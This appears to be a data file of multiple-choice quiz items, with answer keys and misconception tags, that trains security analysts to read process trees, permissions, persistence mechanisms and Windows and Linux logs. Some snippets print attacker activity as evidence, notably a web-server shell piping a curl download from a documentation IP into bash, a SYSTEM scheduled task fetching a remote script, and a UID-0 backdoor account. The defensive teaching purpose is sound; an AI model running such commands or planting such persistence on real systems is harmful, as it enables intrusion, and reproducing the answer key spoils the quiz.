...
export const HOST_ITEMS = [
  // ===================== OS fundamentals & processes =====================
  {
    ...
    choices: [
      'A running instance of a program, with its own memory and PID',
      'An executable file stored on disk, such as notepad.exe',
      'A background user account that Windows uses to run services',
      'A network connection that a program opens to another computer',
    ],
    answer: 'A running instance of a program, with its own memory and PID',
    misconceptions: {
      'An executable file stored on disk, such as notepad.exe': 'proc-program-vs-process',
    },
    explanation:
 ...
 └─ cmd.exe  (PID 5288)
    ...
    choices: [
      'Word spawning cmd and hidden, encoded PowerShell (a macro pattern)',
      'PowerShell running at all: it should never run on a Windows PC',
      'The high PIDs: process IDs above 5000 are usually assigned to malware',
      'The order: cmd.exe should be the parent of WINWORD.EXE, not its child',
    ],
    answer:
      'Word spawning cmd and hidden, encoded PowerShell (a macro pattern)',
    misconceptions: {
      'PowerShell running at all: it should never run on a Windows PC': 'proc-powershell-always-bad',
      'The order: cmd.exe should be the parent of WINWORD.EXE, not its child': 'proc-pid-ppid',
    },
    explanation:
...
www-data  3190  2211  sh -c curl -s http://203.0.113.50/x.sh | bash`,
    choices: [
      'Apache spawned a shell that pipes a download into bash: likely RCE',
      'Normal log rotation: Apache restarts its workers when logs roll over',
      'An administrator updating Apache and its modules with the package manager',
      'The www-data service account logging in over SSH to run a scheduled job',
    ],
    answer:
      'Apache spawned a shell that pipes a download into bash: likely RCE',
    explanation:
  ...
  },
  {
    ...
    choices: [
      'It holds logged-on users\' NTLM hashes and Kerberos tickets',
      'It controls the Windows Firewall and can switch its rules off',
      'It is the parent process of every program a user starts',
      'It stores the Windows event logs, which attackers want to erase',
    ],
    answer:
      'It holds logged-on users\' NTLM hashes and Kerberos tickets',
    explanation:
  ...
  },
  {
    ...
    choices: [
      'Admins run with a standard-user token until they approve a prompt',
      'Encrypts each user\'s files automatically with their own key',
      'Blocks administrator accounts from logging on interactively',
      'Guarantees that malware cannot run without the user\'s consent',
    ],
    answer: 'Admins run with a standard-user token until they approve a prompt',
    misconceptions: {
      'Guarantees that malware cannot run without the user\'s consent': 'perm-uac-guarantee',
    },
    explanation:
...
backup2:x:0:0::/home/backup2:/bin/bash`,
    choices: [
      ...
      'The "x" means the passwords are stored in plain text',
      'alice has a UID above 1000, so she is an administrator',
      'root uses /bin/bash as its login shell instead of sh',
    ],
    answer: 'backup2 has UID 0, giving it root-level privileges',
    misconceptions: {
      'The "x" means the passwords are stored in plain text': 'fs-passwd-hashes',
    },
    explanation:
  ...
  },
  {
    ...
    choices: [
      'SUID: it runs with root\'s privileges, whoever starts it',
      'Socket: the file is a network socket that services listen on',
      'Sticky bit: only the file\'s owner is allowed to delete it',
      'Signed: the file carries a valid digital signature from root',
    ],
    answer: 'SUID: it runs with root\'s privileges, whoever starts it',
    misconceptions: {
      'Sticky bit: only the file\'s owner is allowed to delete it': 'perm-suid-sticky',
      'Signed: the file carries a valid digital signature from root': 'perm-suid-sticky',
    },
    explanation:
  ...
  },
  {
    ...
    choices: [
      ...
      'The file is encrypted, so ls cannot read its name',
      'The file was deleted but is still held open by a process',
      'ls never lists files in /tmp unless you are root',
    ],
    answer: 'Names starting with a dot are hidden; `ls -a` shows them',
    explanation:
  ...
  },
  {
    ...
    choices: [
      'Anything in a user\'s Startup folder runs at each logon',
      'It is the Windows Update folder, so the file can be trusted',
      'Windows automatically quarantines files placed in this folder',
      'This folder only holds Office templates, never executables',
    ],
    answer: 'Anything in a user\'s Startup folder runs at each logon',
    misconceptions: {
      'It is the Windows Update folder, so the file can be trusted': 'fs-trust-name-location',
    },
    explanation:
  ...
  // ===================== Services & persistence =====================
  {
    ...
    choices: [
      'Keeping access working across reboots, logoffs or password changes',
      'Repeatedly guessing passwords until one of them finally works for them',
      'Copying stolen data out of the network a little at a time',
      'Moving from one compromised host to another inside the network',
    ],
    answer: 'Keeping access working across reboots, logoffs or password changes',
    misconceptions: {
      'Repeatedly guessing passwords until one of them finally works for them': 'pers-definition',
      'Copying stolen data out of the network a little at a time': 'pers-definition',
      'Moving from one compromised host to another inside the network': 'pers-definition',
    },
    explanation:
  ...
  },
  {
    ...
    misconceptions: {
      '/var/log/journal/': 'pers-linux-locations',
      '/proc/sys/kernel/': 'pers-linux-locations',
    },
    explanation:
...
Service Account:    LocalSystem`,
    choices: [
      'An auto-start LocalSystem service running from C:\\Users\\Public',
      'Event ID 7045 always means malware was installed on the host by someone',
      '"user mode service" is not a valid Windows service type',
      'Service names must begin with "Microsoft" to be legitimate',
    ],
    answer: 'An auto-start LocalSystem service running from C:\\Users\\Public',
    misconceptions: {
      'Event ID 7045 always means malware was installed on the host by someone': 'pers-new-service-malware',
    },
    explanation:
  ...
  /ru SYSTEM`,
    choices: [
      'Runs a remote script as SYSTEM every 5 minutes, posing as Google',
      'Updates Google Chrome every 5 minutes using a hidden PowerShell helper',
      'Deletes the scheduled task named GoogleUpdateTaskCore as SYSTEM',
      'Runs PowerShell once, hidden, at the next reboot of the machine',
    ],
    answer:
      'Runs a remote script as SYSTEM every 5 minutes, posing as Google',
    misconceptions: {
      'Updates Google Chrome every 5 minutes using a hidden PowerShell helper': 'fs-trust-name-location',
    },
    explanation:
  ...
  },
  {
    ...
    explanation:
      '4624 = "An account was successfully logged on." Its Logon Type field tells you how: 2 = at the keyboard, 3 = over the network (e.g. file share), 10 = Remote Desktop session. Its partner 4625 is the failed logon (note: with Network Level Authentication, failed RDP passwords show as type 3, because the check happens before the session starts).',
  },
  {
    id: 'hl-03',
    skill: 'host-logs',
  ...
  },
  {
    ...
    choices: [
      'Admin-level privileges assigned to a new logon',
      'A user account was locked out after failed logons',
      'The Security audit log was cleared by an account',
      'An account failed to log on with a bad password',
    ],
    answer: 'Admin-level privileges assigned to a new logon',
    explanation:
  ...
  },
  {
    ...
    snippet: `Firewall: ALLOW TCP 203.0.113.44 -> this server :3389 (08:13-08:18)
08:14:02  4625  Account failed to log on   User: administrator
          Source IP: 203.0.113.44   Logon Type: 3   Logon Process: NtLmSsp
08:14:05  4625  (same user, same source, Logon Type: 3)
   ... 214 more 4625 events in 3 minutes ...
08:17:10  1149  RemoteConnectionManager: User authentication succeeded
          User: administrator   Source Network Address: 203.0.113.44
08:17:11  4624  Account successfully logged on   User: administrator
          Source IP: 203.0.113.44   Logon Type: 10`,
    choices: [
      'RDP password guessing that appears to have succeeded',
      'A user who forgot their password, which is harmless',
      'Windows Update authenticating to Microsoft\'s servers',
      'A failed attack: none of the logons succeeded',
    ],
    answer: 'RDP password guessing that appears to have succeeded',
    misconceptions: {
      'A failed attack: none of the logons succeeded': 'log-success-vs-failure',
      'A user who forgot their password, which is harmless': 'log-failures-harmless',
    },
    explanation:
      'Hundreds of 4625 failures from one external IP followed by a success from the same IP is brute force that worked. Why are the failures **Logon Type 3**, not 10? With **Network Level Authentication** (NLA, on by default), RDP checks the password over the network *before* a desktop session exists, so failed RDP guesses log as type 3 (network, NtLmSsp). Event **1149** (TerminalServices-RemoteConnectionManager) records the successful RDP authentication, and **4624 Logon Type 10** (RemoteInteractive) is the desktop session itself. Together with port 3389 in the firewall log, that is RDP. Hunting only for "4625 type 10" misses modern RDP brute force. Escalate now: disable/reset the account and investigate what happened after 08:17.',
  },
  {
    id: 'hl-07',
    skill: 'host-logs',
...
Sep 25 03:12:49 web01 sshd[2235]: Failed password for root from 198.51.100.9 port 51436 ssh2`,
    choices: [
      ...
      'root successfully logged in over SSH from that address',
      'A local user misused sudo to run commands as root',
      'The server is rebooting and sshd is restarting workers',
    ],
    answer: 'One IP is brute-forcing SSH, trying several usernames',
    misconceptions: {
      'root successfully logged in over SSH from that address': 'log-success-vs-failure',
    },
    explanation:
  ...
  },
  {
    ...
    choices: [
      'The Security log was cleared, a common way to hide tracks',
      'A scheduled backup of the Security log finished successfully',
      'A user changed their password outside business hours',
      'The server ran low on disk space for its event logs',
    ],
    answer: 'The Security log was cleared, a common way to hide tracks',
    misconceptions: {
      'A scheduled backup of the Security log finished successfully': 'log-clear-routine',
    },
    explanation:
  ...
  // ===================== Misconception follow-ups (host) =====================
  {
    ...
    choices: [
      'Each entry is a separate process started from the same file',
      'Chrome copied its program file to disk five separate times',
      'Task Manager lists every file inside the Chrome program folder',
      'Four of the five must be malware reusing the Chrome name',
    ],
    answer: 'Each entry is a separate process started from the same file',
    misconceptions: {
      'Chrome copied its program file to disk five separate times': 'proc-program-vs-process',
      'Task Manager lists every file inside the Chrome program folder': 'proc-program-vs-process',
    },
    explanation:
  ...
  },
  {
    ...
    choices: [
      '-bash (PID 4432), the shell of dev\'s SSH session',
      'PID 4519, the number shown next to the command',
      '/usr/sbin/sshd -D (PID 812), because it is listed first',
      '/sbin/init, because every process has PPID 1',
    ],
    answer: '-bash (PID 4432), the shell of dev\'s SSH session',
    misconceptions: {
      'PID 4519, the number shown next to the command': 'proc-pid-ppid',
  ...
  },
  {
    ...
    choices: [
      'Probably legitimate: a signed management agent running its own script',
      'Malicious: PowerShell running as SYSTEM is always an attack',
      'Malicious: -ExecutionPolicy Bypass is only ever used by malware',
      'Unclear, so every PowerShell event like this must be escalated',
    ],
    answer:
      'Probably legitimate: a signed management agent running its own script',
    misconceptions: {
      ...
      'Unclear, so every PowerShell event like this must be escalated': 'proc-powershell-always-bad',
    },
    explanation:
  ...
  },
  {
    ...
    choices: [
      'Sticky bit: only a file\'s owner (or root) can delete or rename it',
      'SUID: any program stored in /tmp runs with root\'s privileges',
      'Write lock: only root can create or modify files in the directory',
      'Timer: the directory\'s contents are wiped automatically every minute',
    ],
    answer: 'Sticky bit: only a file\'s owner (or root) can delete or rename it',
    misconceptions: {
      'SUID: any program stored in /tmp runs with root\'s privileges': 'perm-suid-sticky',
    },
    explanation:
  ...
  },
  {
    ...
    choices: [
      'Very little: once approved, it runs with full admin rights',
      'UAC scanned the file and would have blocked it if malicious',
      'Approved programs run in a sandbox, so the system stays safe',
      'UAC encrypted the program\'s memory before letting it run',
    ],
    answer:
      'Very little: once approved, it runs with full admin rights',
    misconceptions: {
      'UAC scanned the file and would have blocked it if malicious': 'perm-uac-guarantee',
      'Approved programs run in a sandbox, so the system stays safe': 'perm-uac-guarantee',
    },
    explanation:
  ...
  },
  {
    ...
    choices: [
      'Persistence: the key keeps working even after a password change',
      'Credential access: the key lets them brute-force the password',
      'Exfiltration: the key is used to copy data out of the server',
      'Reconnaissance: the key is used to scan the server\'s open ports',
    ],
    answer: 'Persistence: the key keeps working even after a password change',
    misconceptions: {
      'Credential access: the key lets them brute-force the password': 'pers-definition',
      'Exfiltration: the key is used to copy data out of the server': 'pers-definition',
    },
    explanation:
  ...
  },
  {
    ...
    choices: [
      'Expected: signed vendor service, approved change; note it',
      'Malicious: every 7045 event means malware was installed',
      'Malicious: legitimate services never run as LocalSystem accounts',
      'Unknown: service install events carry no useful detail',
    ],
    answer: 'Expected: signed vendor service, approved change; note it',
    misconceptions: {
      'Malicious: every 7045 event means malware was installed': 'pers-new-service-malware',
      'Malicious: legitimate services never run as LocalSystem accounts': 'pers-new-service-malware',
    },
    explanation:
  ...
  },
  {
    ...
    choices: [
      'Likely malicious: a new admin account, then the log cleared',
      'Routine maintenance: clearing the log stops the disk filling up',
      'Nothing to see: 1102 just means the log rolled over normally',
      'A failed attack: clearing the log undid the account changes',
    ],
    answer: 'Likely malicious: a new admin account, then the log cleared',
    misconceptions: {
      'Routine maintenance: clearing the log stops the disk filling up': 'log-clear-routine',
  ...
  },
  {
    ...
    choices: [
      'Password spraying: one external IP, many accounts',
      'A user who forgot their password; no action needed',
      'Normal: Windows retries failed logons automatically',
      'A successful compromise of 41 different accounts',
    ],
    answer: 'Password spraying: one external IP, many accounts',
    misconceptions: {
      ...
      'A successful compromise of 41 different accounts': 'log-success-vs-failure',
    },
    explanation:
